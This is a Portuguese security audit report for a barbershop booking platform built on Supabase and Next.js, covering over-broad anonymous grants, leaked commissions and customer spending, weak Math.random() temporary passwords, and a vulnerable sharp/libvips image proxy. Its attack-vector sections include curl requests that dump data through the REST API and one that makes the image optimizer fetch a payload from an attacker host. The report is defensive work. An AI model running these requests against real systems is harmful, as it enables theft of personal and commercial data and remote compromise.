- `professionals.profile_id` é legível por `anon` (**SEC-003**), o que liga a foto ao **funcionário** e à barbearia onde ele trabalha.

O resultado combinado é um conjunto de dados de rosto + local frequentado + histórico de avaliação, montável por qualquer pessoa em minutos. Isso é tratamento de dado pessoal sensível fora do consentimento — relevante para a LGPD, e o pior tipo de incidente para um produto vendido a barbearias de bairro.

**Nota:** mesmo sem a listagem, o timestamp em milissegundos no nome do arquivo (`Date.now()`) tem ~13 dígitos e não é adivinhável por força bruta. Ou seja, **é a listagem, e só ela, que transforma "URL pública não secreta" em "enumerável em massa"**. É por isso que este achado é ALTO e não MÉDIO.

### Como confirmar

Executar o passo 1 acima contra o projeto real. Se a resposta for um array de objetos com `name` em vez de `[]` ou um 4xx, o achado está confirmado na prática. Alternativamente, no SQL Editor:

```sql
select policyname, roles, cmd, qual
  from pg_policies
 where schemaname = 'storage' and tablename = 'objects' and policyname like 'imagens%';
```

Se `imagens_leitura` tiver `qual = (bucket_id = 'imagens'::text)` e `roles = {anon,authenticated}`, a listagem está aberta.

### Correção sugerida

O erro de fundo é ter juntado, num bucket com uma policy só, conteúdo **de marketing** (logo, capa, foto do barbeiro — que devem ser públicos e indexáveis) e **dado pessoal** (foto do cliente — que não deve). A decisão de "um bucket só" está documentada em `supabase/14_storage_imagens.sql:18-20` com a justificativa de evitar quatro conjuntos de policy em sincronia; ela é razoável para a escrita, e é o que criou este problema na leitura.

Três caminhos, do mais correto ao mais barato:

1. **Separar `clientes/` para um bucket privado** (`public = false`), servindo a foto do próprio usuário por URL assinada de curta duração. É a correção certa: a foto de perfil do cliente só é exibida para ele mesmo (`/app/perfil`) e para a equipe da barbearia onde ele tem ficha — nenhum desses casos exige URL pública eterna. Custa uma migration de bucket, mover os objetos existentes e ajustar `src/lib/imagens.ts` para `createSignedUrl` nesse destino.
2. **Restringir a policy de select por prefixo**, mantendo um bucket só:
   `using (bucket_id = 'imagens' and (storage.foldername(name))[1] in ('barbearias','barbeiros'))` para `anon`, e uma segunda policy para `authenticated` que libere `clientes/<auth.uid()>/…` e o que a equipe da loja precisa ver. Isso fecha a listagem em massa das fotos de cliente **sem** quebrar a logo em `/b/[slug]`. Mais barato, e não exige mover arquivo nenhum.
3. **Mínimo aceitável:** documentar explicitamente que a foto do cliente é pública, e dizer isso ao usuário no momento do upload. Não recomendado — a tela hoje não avisa nada disso.

Independentemente da escolha, acrescentar ao portão da migration 14 (que hoje só confere que o bucket é público e que existem 4 policies, linhas 174-198) um teste de que `anon` **não** consegue enxergar objetos sob `clientes/`.

---

## SEC-003 — `grant select` na tabela `professionals` inteira expõe a comissão de cada barbeiro e o `profile_id` dele a qualquer visitante

| Campo | Valor |
|---|---|
| **Severidade** | ALTO |
| **Arquivo:linha** | `supabase/03_rls.sql:518` (o grant) · `supabase/15_comissao_do_dia.sql:71-72` (a coluna que entrou depois) · `src/lib/queries/barbearia.ts:193` e `src/app/b/[slug]/agendar/page.tsx:40-45` (o vazamento no bundle) |
| **Status** | CONFIRMADO |

### O que está errado

O grant para `anon` é de **tabela inteira**, sem lista de colunas:

```sql
-- supabase/03_rls.sql:517-518
revoke all on all tables in schema public from anon;
grant select on barbershops, services, professionals, business_hours, reviews to anon;
```

Isso é uma incoerência dentro do próprio arquivo: 12 linhas abaixo, o mesmo `03_rls.sql` usa **grant por coluna** para `profiles` e `barbershops`, com um comentário explicando por que o recorte por coluna é indispensável (linhas 523-531). A técnica está no arquivo; ela só não foi aplicada aos `select` de `anon`.

Quando `professionals` recebeu o grant, ela tinha: `id, barbershop_id, name, nickname, bio, avatar_url, commission_percent, is_active, sort_order, created_at`. Duas colunas dessas nunca deveriam ser públicas:

- **`commission_percent`** (`supabase/01_schema.sql:202`) — o percentual de comissão que o dono paga àquele barbeiro. É informação comercial confidencial: define a margem da loja e é a base do salário do profissional.
- **`profile_id`** — acrescentada **depois** por `supabase/15_comissao_do_dia.sql:71-72`. Coluna nova nasce dentro do grant de tabela existente, então ela ficou pública **sem que nenhuma decisão fosse tomada**. É o `auth.users.id` do funcionário.

O mesmo arquivo que criou `profile_id` alerta, em outro contexto, sobre esta exata categoria de armadilha — `supabase/17_agendamento_publico.sql:81-90`: *"Coluna nova nasce FORA dessa lista"*, dito sobre o grant de **update** por coluna. Com o grant de **select** por tabela, o efeito é o inverso e pior: a coluna nova nasce **dentro** do que já é público.

### O vazamento também acontece pelo próprio site

Não é preciso nem usar a API. A consulta pública faz `select("*")`:

```ts
// src/lib/queries/barbearia.ts:189-197
async function carregarProfissionais(shopId: string): Promise<Professional[]> {
  const supabase = clientePublico();
  const { data, error } = await supabase
    .from("professionals")
    .select("*")                              // ← traz commission_percent e profile_id
    .eq("barbershop_id", shopId)
    .eq("is_active", true)
```

`Professional` é `Tables<"professionals">` — a linha inteira (`src/lib/types.ts:34`). E o array é entregue direto a um **componente de cliente**:

```tsx
// src/app/b/[slug]/agendar/page.tsx:40-45
<BookingWizard
  shopId={loja.id}
  …
  profissionais={profissionais}    // ← BookingWizard.tsx:1 é "use client"
```

Props de um componente `"use client"` são **serializadas no payload RSC** que o navegador baixa. Portanto: **abrir `/b/qualquer-barbearia/agendar` e olhar o código-fonte da página já entrega a comissão de todos os barbeiros daquela loja.** Nenhuma ferramenta, nenhuma chave, nenhum conhecimento de API.

Como o resultado ainda passa por `unstable_cache` (`src/lib/queries/barbearia.ts:117-148`), o dado fica guardado por até 5 minutos e é servido igual para todo mundo — o que aqui é irrelevante, porque ele já era público para todos.

### Vetor de ataque

**Caminho A — sem nenhuma ferramenta.** Abrir `https://<site>/b/<slug>/agendar`, exibir o código-fonte, procurar por `commission_percent`. Os valores estão no payload RSC.

**Caminho B — em massa, com a chave anônima:**

```bash
curl -s "$URL/rest/v1/professionals?select=name,nickname,commission_percent,profile_id,barbershop_id" \
     -H "apikey: $ANON"
```

Devolve **todos os profissionais ativos de todas as barbearias ativas** — a policy `professionals_public_select` (`supabase/03_rls.sql:144-150`) libera a linha, e o grant libera todas as colunas.

### Impacto

1. **Confidencialidade comercial.** Um concorrente extrai, numa requisição, a estrutura de comissão de todas as barbearias da plataforma. Um barbeiro descobre quanto o colega recebe — e quanto os barbeiros da loja da esquina recebem. Isso é conflito trabalhista real dentro do cliente que paga pelo produto.
2. **Prejuízo direto ao PiBarber como negócio.** A base agregada de comissões praticadas por região é um dado que a plataforma detém e que fica exposto de graça.
3. **`profile_id` como identificador de correlação.** Não é uma credencial e não dá acesso a nada sozinho, mas encadeia com **SEC-002** (o caminho do Storage é `clientes/{profile_id}/…`) e com **SEC-004** (`reviews.profile_id`), permitindo ligar funcionário ↔ conta ↔ foto ↔ avaliações escritas.

### Como confirmar

```sql
select table_name, column_name, privilege_type
  from information_schema.column_privileges
 where table_schema = 'public' and grantee = 'anon' and table_name = 'professionals';
```

Se aparecerem **todas** as colunas com `SELECT`, o achado está confirmado. Na aplicação, basta o Caminho A acima.

### Correção sugerida

1. **Trocar o grant de tabela por grant de coluna**, no mesmo estilo que `03_rls.sql:530` e `:536` já usam para `update`:
   ```sql
   revoke select on professionals from anon;
   grant select (id, barbershop_id, name, nickname, bio, avatar_url, is_active, sort_order) on professionals to anon;
   ```
   Repetir o exercício para `barbershops` (ver **SEC-009**) e `reviews` (ver **SEC-004**). `services` e `business_hours` foram revisadas coluna a coluna e **não têm nada sensível** — podem ficar como estão, mas convém tornar a lista explícita para que a próxima coluna nova não herde publicidade por acidente.
2. **Trocar o `select("*")` por uma lista explícita** em `src/lib/queries/barbearia.ts:193` (e, pelo mesmo raciocínio, revisar os `select("*")` das linhas 124, 176 e 210). Um `select("*")` numa consulta pública é uma promessa de que toda coluna futura da tabela também será pública.
3. **Acrescentar um portão de migração** que falhe se `anon` tiver `SELECT` em `professionals.commission_percent` ou `professionals.profile_id`, para que uma coluna futura sensível não volte a herdar o grant em silêncio. O projeto já domina esse padrão — ver `supabase/09_beneficios.sql:224-234`, que faz exatamente essa verificação para privilégios de escrita de `anon`.

---

## SEC-013 — O assistente vê quanto cada cliente já gastou, e somando a lista obtém o faturamento histórico da barbearia

| Campo | Valor |
|---|---|
| **Severidade** | ALTO |
| **Arquivo:linha** | `src/app/painel/clientes/page.tsx:102,169` · `src/app/painel/clientes/[id]/page.tsx:41,114-119` · `supabase/03_rls.sql:247-250` (a policy) · `src/components/painel/menu.ts:39` (a tela não é `soDono`) |
| **Status** | CONFIRMADO |

### O que está errado

A arquitetura inteira deste sistema é organizada em torno de **uma regra**, declarada em maiúsculas no topo da seção de dinheiro de `supabase/03_rls.sql:446-451`:

> *"DINHEIRO — aqui mora a regra 'assistente não vê faturamento'. `can_manage_money()` é verdadeiro SÓ para o dono e o admin. O assistente autenticado que chamar `/rest/v1/transactions?select=*` recebe `[]` — não porque o menu está escondido, mas porque o Postgres não devolve a linha."*

A regra é aplicada com rigor em `transactions`, `commissions`, `commission_payments` e nas funções `revenue_series` e `dashboard_summary`. **E há um vazamento por uma tabela que ninguém classificou como financeira:** `customers.total_spent`.

A coluna é mantida por `complete_appointment` e acumula o valor líquido de cada atendimento concluído:

```sql
-- supabase/16_pendencias.sql:229-233
update customers
   set total_visits  = total_visits + 1,
       total_spent   = total_spent + v_liquido,
       last_visit_at = now()
 where id = v_customer;
```

Mas `customers` é classificada como **operacional**, e sua policy usa `has_shop_access` — que inclui o assistente:

```sql
-- supabase/03_rls.sql:247-250
create policy customers_select on customers
  for select to authenticated
  using (has_shop_access(barbershop_id));
```

E a tela que a exibe **não é restrita ao dono**. `/painel/clientes` usa `requireShopContext()` (linha 102), e o item de menu correspondente não tem a marca `soDono`:

```ts
// src/components/painel/menu.ts:39
{ href: "/painel/clientes", rotulo: "Clientes", Icone: Users, destaque: true },
```

O valor é renderizado, em reais, para cada cliente da lista:

```tsx
// src/app/painel/clientes/page.tsx:167-170
<span className="hidden shrink-0 text-right sm:block">
  <span className="tnum block text-sm font-semibold text-ink">
    {brl(c.total_spent)}
  </span>
```

E de novo, em destaque, na ficha individual — também sob `requireShopContext()`:

```tsx
// src/app/painel/clientes/[id]/page.tsx:114-119
<StatCard
  rotulo="Total gasto"
  valor={brl(Number(cliente.total_spent))}
  tom="money"
```

### Vetor de ataque

Não é preciso nem abusar de nada — **basta usar a tela**. O assistente abre `/painel/clientes` e lê, cliente a cliente, quanto cada um já gastou na loja.

Para obter o **agregado** — que é o número que a regra existe para proteger — uma requisição com a sessão dele:

```bash
# `authenticated` tem grant select em customers; a RLS libera pela loja dele.
curl -s "$URL/rest/v1/customers?select=total_spent&barbershop_id=eq.$SHOP" \
  -H "apikey: $ANON" -H "Authorization: Bearer $TOKEN_DO_ASSISTENTE"
```

Somar o resultado dá o **faturamento histórico acumulado da barbearia** — porque `total_spent` é a soma dos líquidos de todo atendimento concluído, e todo atendimento concluído pertence a exatamente uma ficha. Não é uma aproximação: é o mesmo número que o dono vê, com outro recorte.

O PostgREST ainda aceita agregação direta, dispensando o somatório manual:
`?select=total_spent.sum()`.

Nenhuma policy é violada. Nenhuma trava é contornada. A informação simplesmente está do lado errado da linha que o projeto traçou.

### Impacto

1. **A regra central do produto não vale.** O assistente é, tipicamente, um barbeiro ou recepcionista contratado. O dono contratou o PiBarber com a garantia — escrita na documentação do próprio sistema — de que essa pessoa não veria o faturamento. Ela vê.
2. **Faturamento histórico, não só o do dia.** `total_spent` é acumulado desde sempre; nem o filtro de período do painel limita.
3. **Perfil comercial por cliente.** Saber que "o Sr. Antônio já deixou R$ 4.200 aqui" é informação que um funcionário de saída leva para o concorrente junto com o telefone — que ele também vê na mesma tela.
4. **Encadeia com o fiado.** `/painel/fiado` já é acessível ao assistente **de propósito** e com justificativa boa (`supabase/03_rls.sql:466-471`: quem cobra no balcão precisa saber quem deve). Somando fiado + `total_spent`, o assistente tem uma visão financeira bem além do operacional.

### Contexto honesto sobre a severidade

O assistente **não é um estranho**: ele já enxerga a agenda inteira, a ficha de todos os clientes com telefone e as observações privadas do barbeiro (`customers.notes`), e o fiado em aberto. Não é escalada de privilégio para fora da barbearia — o isolamento multi-tenant continua intacto, e ele não alcança `transactions`, `commissions`, o Caixa nem os Relatórios.

Classificado como **ALTO** mesmo assim por um motivo específico: **é a violação direta de uma garantia que o sistema afirma, por escrito e em vários lugares, estar cumprindo.** Um dono que leia a documentação vai acreditar que está protegido. O risco de um controle que existe no papel e não na prática é maior que o de um controle que nunca foi prometido.

### Como confirmar

Com a sessão de um `assistant`, executar o `curl` acima. Se devolver valores em vez de `[]`, o achado está confirmado. Comparar a soma com:

```sql
select sum(amount) from transactions
 where barbershop_id = '<SHOP_ID>' and type = 'income';
```

### Correção sugerida

Não há solução por RLS pura: **a RLS filtra linha, não coluna**, e o assistente precisa legitimamente das outras colunas de `customers` (nome, telefone, observações) para operar o balcão. O projeto conhece esse limite e o registra em `supabase/03_rls.sql:239-241`, ao explicar por que o **cliente** não lê a própria ficha.

Três caminhos, do mais correto ao mais barato:

1. **Grant por coluna, como o arquivo já faz para `profiles` e `barbershops`.** Revogar `select` de `customers` para `authenticated` e reconceder sem `total_spent`; depois expor esse valor só ao dono, por uma função `security definer` que confira `can_manage_money(p_shop)` — mesmo padrão de `comissoes_do_dia` (`supabase/15_comissao_do_dia.sql:211-213`). É a correção que faz a regra valer no banco, e não na tela.
   ⚠️ **Atenção:** um `revoke`/`grant` de coluna em `customers` afeta `book_appointment` e as demais funções? Não — elas são `security definer` e rodam com os privilégios do dono da função, independentes do grant do chamador. Mas **verifique**, porque as Server Actions `salvarCliente` e `buscarClientes` fazem `select` como o usuário e precisam continuar funcionando.
2. **Manter `total_spent` acessível e esconder só na tela**, condicionando a `podeVerDinheiro` em `/painel/clientes:167-174` e `/painel/clientes/[id]:114-119`. Custa duas condicionais — **e não é uma trava**: o assistente continua obtendo o número pela API REST. Só vale como paliativo imediato enquanto (1) não sai, e não deve ser registrado como resolvido.
3. **Decidir que o assistente pode ver.** É uma escolha de produto defensável — mas então a documentação de `supabase/03_rls.sql:446-451` e os comentários de `src/app/actions/money.ts:12-19` precisam ser corrigidos, porque hoje afirmam o contrário.

---

## SEC-011 — As senhas provisórias do dono e do assistente são geradas com `Math.random()`

| Campo | Valor |
|---|---|
| **Severidade** | ALTO (era BAIXO na rodada 1, antes de o gerador ser localizado) |
| **Arquivo:linha** | `src/components/painel/EquipeAcessos.tsx:133-144` (senha do assistente) · `src/components/admin/AdminPainel.tsx:148-149` (**senha do dono**) · `src/app/actions/team.ts:297` e `src/app/actions/admin.ts:54` (a única validação) |
| **Status** | CONFIRMADO |

### O que está errado

```ts
// src/components/painel/EquipeAcessos.tsx:133-144
function senhaProvisoria(): string {
  const letras = "abcdefghjkmnpqrstuvwxyz";
  const numeros = "23456789";
  let saida = "";
  for (let i = 0; i < 5; i += 1) {
    saida += letras[Math.floor(Math.random() * letras.length)];
  }
  for (let i = 0; i < 3; i += 1) {
    saida += numeros[Math.floor(Math.random() * numeros.length)];
  }
  return saida;
}
```

O mesmo código, duplicado, em `src/components/admin/AdminPainel.tsx:148-149` — e ali ele gera a senha da conta de **dono de barbearia**, criada por `criarBarbearia`. Essa é a conta com acesso a caixa, comissões, fiado, relatórios e à ficha de todos os clientes da loja.

A senha é gerada, já preenchida, no formulário, e o dono a aceita sem alterar no caminho normal.

**Dois problemas independentes:**

**1. `Math.random()` não é criptográfico.** No V8 ele é um `xorshift128+`. Não é imprevisível: recuperar o estado interno a partir de um punhado de saídas consecutivas é um ataque publicado e implementado. Não é uma função para gerar credencial — para isso o padrão é `crypto.getRandomValues()` no navegador ou `crypto.randomBytes()` no servidor. **O projeto já usa a API correta em outros pontos**: `crypto.randomUUID()` aparece em `ComissoesPainel.tsx:292` (chave de idempotência) e `BookingWizard.tsx:974` (UID do .ics). A função certa estava a uma linha de distância.

**2. O espaço de busca é pequeno e a forma é pública.** 23 letras (sem `i`, `l`, `o`) × 5, depois 8 dígitos (sem `0`, `1`) × 3:

> 23⁵ × 8³ = 6.436.343 × 512 ≈ **3,3 × 10⁹ ≈ 2³¹,६**

Cerca de **31,6 bits** — e isso no melhor caso, supondo o RNG uniforme e imprevisível, o que `Math.random()` não garante. Pior: o **formato é rígido e conhecido** (exatamente cinco minúsculas seguidas de três dígitos, de alfabetos reduzidos), porque este código vai no bundle JavaScript e qualquer um o lê. Um atacante não precisa testar todo o espaço de senhas de 8 caracteres — só este subconjunto.

E a única validação do lado servidor é comprimento:

```ts
// src/app/actions/team.ts:297
if (senha.length < 6) return falha("A senha provisória precisa ter pelo menos 6 caracteres.");
```

### Vetor de ataque

**Caminho A — adivinhação online.** O atacante conhece o formato (está no bundle) e o e-mail do alvo (o e-mail do dono aparece em `/admin` para quem for admin; o do assistente costuma ser previsível dentro da loja). Ataca `/entrar` com o subconjunto de 3,3 bilhões. A viabilidade depende inteiramente do limite de taxa do Supabase Auth, que **não foi verificado** — ver SEC-008. Sem limite forte, é um alvo prático; com limite, é caro.

**Caminho B — previsão do PRNG.** Se o atacante conseguir observar saídas de `Math.random()` do mesmo contexto JavaScript, recupera o estado e prevê a senha exata, sem adivinhar. É um caminho estreito na prática — exige código do atacante na mesma página — mas é exatamente o risco que "não use `Math.random()` para credencial" existe para evitar, e ele deixa de ser hipotético se algum dia houver um XSS (lembrando que **não há CSP** — SEC-005).

**Caminho C — o mais provável de todos: a senha nunca é trocada.** Não existe mecanismo que force a troca no primeiro acesso. `criarAssistente` diz *"Copie a senha e entregue ao assistente"* (`src/app/actions/team.ts:348`) e o diálogo reforça *"Esta senha não aparece de novo"* (`EquipeAcessos.tsx:212`). Nada mais acontece. Uma senha de ~31 bits, gerada por PRNG fraco, tende a ser a senha **permanente** da conta.

### Impacto

Comprometer a conta do **dono** entrega a barbearia inteira: faturamento, comissões, fiado, dados de todos os clientes, e a capacidade de alterar as configurações públicas da loja. Comprometer a do **assistente** entrega a agenda e a base de clientes com telefone e observações.

### Como confirmar

Ler as duas funções citadas. Para medir o espaço na prática: gerar mil senhas com o mesmo código e conferir que todas casam com `/^[a-hj-km-z]{5}[2-9]{3}$/`.

### Correção sugerida

1. **Gerar no servidor, com CSPRNG.** Mover a geração para a Server Action (`criarAssistente` e `criarBarbearia`), usando `crypto.randomBytes` do Node. Isso resolve os dois problemas de uma vez — aleatoriedade real e um valor a menos trafegando do navegador para o servidor (ver a ressalva de trânsito mais abaixo).
2. **Aumentar a entropia.** Manter o alfabeto sem caracteres ambíguos é uma boa decisão de usabilidade (a senha é lida em voz alta ou copiada à mão); o que precisa mudar é o comprimento. Com 31 caracteres no alfabeto, ~13 caracteres dão ~64 bits. Para uma senha que será digitada uma vez e trocada, o comprimento não incomoda.
3. **Forçar a troca no primeiro acesso.** É o que transforma "senha provisória" em algo de fato provisório. Sem isso, os itens 1 e 2 só melhoram a senha permanente.
4. **Conferir a política de senha do Supabase Auth** (painel → Authentication → Policies): mínimo acima de 6 e verificação contra vazamentos conhecidos.

**Ressalva de trânsito, herdada da rodada 1 e ainda válida:** hoje a senha vai do navegador para o servidor no payload da Server Action e volta no resultado (`src/app/actions/team.ts:287,348`; `src/app/actions/admin.ts:42-43,107-110`). Sobre HTTPS não é interceptável, mas amplia os lugares onde ela pode ser capturada por observabilidade — se um dia forem ativados logs de payload de Server Action na Vercel, ou um APM que capture corpo de requisição, senhas em claro passam a ser gravadas. A correção (1) elimina metade desse trânsito.

---

## SEC-014 — `sharp` 0.34.5 com quatro CVEs de libvips, alcançável pela internet por causa do proxy de imagem aberto

| Campo | Valor |
|---|---|
| **Severidade** | ALTO |
| **Arquivo:linha** | `package.json:17` (`next ^15.5.4`) · `next.config.ts:39` (o curinga que expõe) |
| **Status** | CONFIRMADO — `npm audit --omit=dev` **foi executado** nesta rodada |

### O que está errado

Saída real do comando, resumida:

```
sharp  <0.35.0                                Severity: high
  sharp inherited vulnerabilities in libvips:
  CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591
  node_modules/sharp                          → instalado: 0.34.5

postcss  <=8.5.22                             Severity: high
  4 avisos (XSS via </style>; leitura arbitrária e path traversal via sourceMappingURL)
  node_modules/next/node_modules/postcss

next  9.3.4-canary.0 - 16.3.0-preview.10      → instalado: 15.5.23
  Depends on vulnerable versions of postcss and sharp

3 high severity vulnerabilities
```

`sharp` é o motor do otimizador de imagens do Next: é ele quem baixa a imagem remota e a reprocessa em `/_next/image`. As quatro CVEs são de **libvips**, a biblioteca nativa que faz o decode.

### O vetor: a cadeia com SEC-006

Nenhuma das duas condições, isolada, seria ALTO:

- Um otimizador de imagem aberto com libvips íntegro é abuso de banda (era o SEC-006 original, MÉDIO).
- Uma libvips vulnerável atrás de uma lista fechada de hosts confiáveis é risco baixo, porque a entrada é controlada.

**Elas coexistem.** `next.config.ts:39` declara `{ protocol: "https", hostname: "**" }` — qualquer host HTTPS serve de origem, sem autenticação:

```bash
# O servidor do PiBarber baixa o arquivo e o entrega ao decoder nativo:
curl "https://<site>/_next/image?url=https%3A%2F%2Fhost-do-atacante%2Fpayload.tiff&w=1920&q=75"
```

Ou seja: **a superfície de processamento de imagem não confiável do produto está aberta à internet inteira, com quatro CVEs conhecidas no decoder.** O impacto depende da natureza de cada CVE (não avaliada aqui em detalhe), mas a categoria — bug de memória em decodificador de imagem nativo, alcançável remotamente e sem autenticação — é a que historicamente produz execução de código.

`/_next/image` roda no runtime que serve o site. Na Vercel isso significa a função serverless que também tem `SUPABASE_SERVICE_ROLE_KEY` no ambiente.

As CVEs de `postcss` são de **tempo de build** (processamento de CSS que vem do próprio repositório), não de tempo de requisição. Risco bem menor; entram na conta porque saem na mesma atualização.

### Como confirmar

```bash
npm audit --omit=dev
npm ls sharp
```

E ler `next.config.ts:24-40` para a metade que está no código — o comentário lá reconhece o custo do curinga (*"o otimizador do Next passa a poder buscar imagem de qualquer host https"*), mas foi escrito avaliando abuso de banda, não decoder vulnerável.

### Correção sugerida

**A ordem importa, e o passo 1 é o que dá resultado imediato sem risco de regressão:**

1. **Fechar o `remotePatterns`** (é o SEC-006). Mudança só de configuração, sem tocar em dependência. Sozinha, retira a libvips vulnerável do alcance de entrada não confiável — que é o que transforma isto em ALTO. **Faça antes**, mesmo que a atualização do Next demore semanas.
2. **Subir `sharp` para ≥ 0.35.0.** Ele aparece como dependência de topo (`node_modules/sharp`), então talvez dê para fixá-lo por `overrides` no `package.json` sem subir o Next de major. Testar o otimizador depois — é a única coisa que usa `sharp`.
3. **Planejar a subida do Next.** `npm audit fix --force` propõe `next@16.3.1`, **breaking change**; não rodar às cegas. Verificar antes se há patch dentro da linha 15.x que já traga o `postcss` corrigido (`npm view next@15 versions` + notas de release).
4. **`npm audit --omit=dev` no CI**, falhando em severidade alta.

Ver também **BUG-017** em `AUDITORIA_BUGS.md`, que trata o mesmo achado pelo ângulo de manutenção de dependências.

---

# MÉDIO

> **Nota de leitura:** `SEC-006` aparece nesta seção mas está classificado **ALTO** desde a rodada 2. Ele foi mantido na posição original para os identificadores não mudarem entre versões deste documento — a severidade que vale é a do cabeçalho do achado, e a cadeia completa está descrita em **SEC-014**.

## SEC-004 — `reviews.profile_id` e `reviews.appointment_id` são legíveis por `anon`, permitindo mapear quem frequenta qual barbearia

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `supabase/03_rls.sql:518` (o grant) · `supabase/03_rls.sql:383-386` (a policy) |
| **Status** | CONFIRMADO |

> ## ✅ [CORRIGIDO em 16/08/2026] — para `anon`; ver "o que continua pendente"
>
> Criada a migration **`supabase/23_reviews_sem_anon.sql`**, com as duas metades do vazamento:
>
> - **`revoke select on reviews from anon`** — o grant de tabela inteira, que era o resíduo do desenho anterior ao arquivo 10.
> - **`drop policy reviews_public_select`** — a policy só existia `to anon` e ficaria morta. Removida não por limpeza, mas para que um `grant select on reviews to anon` sozinho, um dia, **não reabra o vazamento inteiro**: sem policy, a RLS nega por padrão.
>
> **Verificado antes de revogar** — todas as leituras de `reviews` em `src/`, uma a uma:
>
> | Onde | Operação | Papel | Afetado? |
> |---|---|---|---|
> | `src/lib/queries/barbearia.ts:270` | `rpc("public_reviews")` | `anon` | **não** — `security definer`, não usa o grant do chamador |
> | `src/app/actions/booking.ts:338` | `insert` | `authenticated` | não |
> | `src/app/actions/shop.ts:419` | `update` | `authenticated` | não |
> | `src/app/painel/avaliacoes/page.tsx:65` | `select` | `authenticated` | não |
>
> Nenhuma leitura anônima direta da tabela — confirma o que o achado afirmava.
>
> **Também alterado:** `supabase/03_rls.sql` — `reviews` saiu da lista do grant (linha 518) e o `create policy reviews_public_select` virou comentário explicando para onde foi. Sem isso, reaplicar o arquivo reabriria tudo.
>
> **O portão da 23 confere os dois lados:** falha se `anon` reganhar `select` em `reviews` ou se a policy voltar, **e** falha se `public_reviews()` perder o `grant execute … to anon` — porque ela é agora a única porta da aba Avaliações do perfil público, e sem ela a tela ficaria vazia em silêncio.
>
> ### O que continua PENDENTE
>
> **O mesmo dado segue acessível a qualquer conta autenticada.** `authenticated` tem `grant select on all tables` (`03_rls.sql:521`) e a policy `reviews_select` libera toda avaliação de loja ativa. Como o cadastro é público e gratuito, **o vetor deste achado sobrevive ao custo de criar uma conta** — o dump de `profile_id` + `barbershop_id` e o grafo pessoa ↔ barbearia continuam montáveis.
>
> Não foi corrigido porque exige grant por coluna em `reviews` para `authenticated`, com risco concreto de quebrar o embed `autor:profiles!reviews_profile_id_fkey` de `/painel/avaliacoes` — território do **BUG-019** (ALTO, fora do escopo desta rodada). Decisão de escopo tomada com o dono do produto. **A correção só vale para visitante sem conta.**
>
> ⚠️ **Não executado:** sem `psql` na máquina, a migration não foi rodada nem teve a sintaxe validada.

### O que está errado

Mesma raiz do SEC-003: `grant select on … reviews … to anon` é de tabela inteira. As colunas de `reviews` (`src/lib/database.types.ts`, tabela `reviews`) são: `id, barbershop_id, appointment_id, profile_id, professional_id, rating, comment, reply, replied_at, created_at`.

A policy libera toda avaliação de loja ativa:

```sql
-- supabase/03_rls.sql:383-386
create policy reviews_public_select on reviews
  for select to anon
  using (exists (select 1 from barbershops b where b.id = barbershop_id and b.is_active));
```

O que torna isto notável é que **o projeto já tinha resolvido este problema — e a solução está no repositório, não sendo usada por este caminho.** A migration `supabase/10_avaliacoes_publicas.sql` criou `public_reviews()`, uma função `security definer` que devolve exatamente as colunas públicas e **abrevia o nome do autor** ("Guilherme S."), com a justificativa escrita nas linhas 32-36: *"a avaliação é pública e indexada pelo Google. Nome completo mais barbearia mais bairro identifica uma pessoa"*. A aplicação usa essa função corretamente (`src/lib/queries/barbearia.ts:270-273`).

Mas o **grant direto na tabela continuou existindo ao lado dela**, e por ele sai o `profile_id` cru — que é um identificador ainda mais estável que o nome.

### Vetor de ataque

```bash
# Todas as avaliações de todas as lojas ativas, com o identificador do autor:
curl -s "$URL/rest/v1/reviews?select=profile_id,barbershop_id,rating,comment,created_at" \
     -H "apikey: $ANON"
```

Com esse dump, o atacante constrói:

1. **Um grafo pessoa ↔ barbearia.** Agrupando por `profile_id`, obtém-se a lista de estabelecimentos que cada pessoa frequentou e avaliou — inclusive em cidades diferentes. É um padrão de deslocamento.
2. **A ponte para a foto de rosto**, via SEC-002: `clientes/{profile_id}/foto-*.webp`.
3. **A ponte para o funcionário**, via SEC-003: se algum `profile_id` também aparece em `professionals.profile_id`, sabe-se que aquela pessoa é barbeiro em determinada loja.
4. **`appointment_id`** permite contar e correlacionar atendimentos, embora `appointments` em si não seja legível por `anon` (a RLS bloqueia — verificado em `supabase/19_agendamento_de_quem_criou.sql:85-91`).

Nenhum desses passos exige conta, e o resultado é um perfil comportamental de clientes reais montado a partir de um endpoint público.

### Impacto

Exposição de PII por correlação. Isoladamente um uuid não identifica ninguém; combinado com a foto de rosto (SEC-002) e com o texto assinado da avaliação, identifica. Para um produto brasileiro, é exposição de dado pessoal sob a LGPD sem base legal aparente — a pessoa consentiu em publicar uma **avaliação**, não em publicar seu histórico de estabelecimentos frequentados.

### Como confirmar

```sql
select column_name, privilege_type from information_schema.column_privileges
 where table_schema='public' and grantee='anon' and table_name='reviews';
```

### Correção sugerida

**Revogar o `select` de `anon` em `reviews` por completo.** A leitura pública das avaliações já é feita, corretamente e com recorte, por `public_reviews()` — que tem `grant execute … to anon` (`supabase/10_avaliacoes_publicas.sql:111`) e é a única porta que a aplicação usa. O grant de tabela é um resíduo do desenho anterior ao arquivo 10, e removê-lo **não quebra nenhum caminho da aplicação** (verificado: a única leitura pública de `reviews` em `src/` é a RPC em `src/lib/queries/barbearia.ts:270`).

Antes de revogar, confirmar com `grep -rn '\.from("reviews")' src/` que não sobrou nenhuma leitura direta em contexto anônimo. As leituras encontradas — `src/app/actions/booking.ts:338` (insert do autor, `authenticated`) e `src/app/actions/shop.ts:418-422` (update do dono, `authenticated`) — não são afetadas.

---

## SEC-005 — Nenhum header de segurança HTTP é definido

| Campo | Valor |
|---|---|
| **Severidade** | MÉDIO |
| **Arquivo:linha** | `next.config.ts` (arquivo inteiro, 44 linhas — não há função `headers()`) |
| **Status** | CONFIRMADO |

### O que está errado

`next.config.ts` define apenas `images.remotePatterns`. Não há `async headers()`, e nenhum outro mecanismo de header foi encontrado no repositório (`grep -c "headers" next.config.ts` retorna 0). Portanto o site é servido **sem**:

| Header | O que falta proteger |
|---|---|
| `Content-Security-Policy` | Um XSS refletido em qualquer ponto não coberto por esta auditoria (≈75 componentes não lidos) executa sem obstáculo. Também nada limita a exfiltração para host externo. |
| `Strict-Transport-Security` | O navegador aceita uma primeira conexão em HTTP e é vulnerável a downgrade. A Vercel serve HTTPS, mas sem HSTS o compromisso não é declarado. |
| `X-Frame-Options` / `frame-ancestors` | O painel pode ser embutido num iframe de terceiro — clickjacking sobre botões de ação real (concluir atendimento, pagar comissão, excluir conta). |
